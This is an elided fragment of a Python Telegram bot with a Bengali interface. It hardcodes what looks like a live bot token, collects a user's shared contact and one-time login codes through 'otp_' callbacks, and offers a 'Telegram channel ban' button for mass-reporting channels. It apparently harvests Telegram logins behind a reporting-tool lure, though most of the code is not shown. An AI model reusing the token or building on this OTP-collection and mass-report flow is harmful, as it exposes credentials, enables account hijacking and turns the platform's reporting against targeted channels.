...
# Bot configuration
BOT_TOKEN = "8552138114:AAGjWPWQWP-cOoVjcM8aOFd1acc3lwGlNyQ"
...
async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if status == "AUTHORIZED":
        ...
        keyboard = [
            [InlineKeyboardButton("⚠️ Telegram channel ban ⛔", callback_data="broadcast")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("টেলিগ্রাম চ্যানেল রিপোর্ট করতে নিচের বোতামে ক্লিক করুন ", reply_markup=reply_markup)
    elif status == "OTP":
    ...
    if query.data.startswith("otp_"):
        ...
        if action.isdigit():
            ...
            if success:
                ...
                reply_markup = InlineKeyboardMarkup(keyboard)
                await query.message.reply_text("টেলিগ্রাম চ্যানেল রিপোর্ট করতে নিচের বোতামে ক্লিক করুন ", reply_markup=reply_markup)
            else:
